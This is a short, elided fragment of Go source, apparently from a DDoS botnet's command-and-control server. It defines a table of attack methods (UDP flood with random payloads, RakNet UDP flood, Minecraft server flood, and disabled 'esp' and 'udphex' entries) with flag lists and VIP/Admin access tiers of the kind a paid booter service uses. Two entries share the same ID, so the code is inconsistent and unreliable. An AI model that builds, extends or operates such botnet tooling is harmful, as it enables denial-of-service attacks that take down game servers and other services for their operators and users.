...
var attackInfoLookup = map[string]AttackInfo{
    ...
    "udprand": {
        ID:          15,
        Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 26, 27, 30},
        Description: "UDP flood with random payload sizes",
        Vip:         false,
        Admin:       false,
        Disabled:    "",
    },
    "udprak": {
        ID:          16,
        Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 26, 27, 30},
        Description: "RakNet UDP flood (optimized for RakNet servers)",
        Vip:         false,
        Admin:       false,
        Disabled:    "",
    },
    "minecraft": {
        ID:          17,
        Flags:       []uint8{0, 6, 7, 30},
        Description: "Minecraft server flood",
        Vip:         false,
        Admin:       false,
        Disabled:    "",
    },
    "esp": {
        ...
        Vip:         false,
        Admin:       false,
        Disabled:    "Not implemented in bot (use udprak instead)",
    },
    "udphex": {
        ID:          17,
        Flags:       []uint8{0, 6, 7, 30},
        ...
        Vip:         false,
        Admin:       false,
        Disabled:    "Not implemented in bot (use minecraft instead)",
    },
}
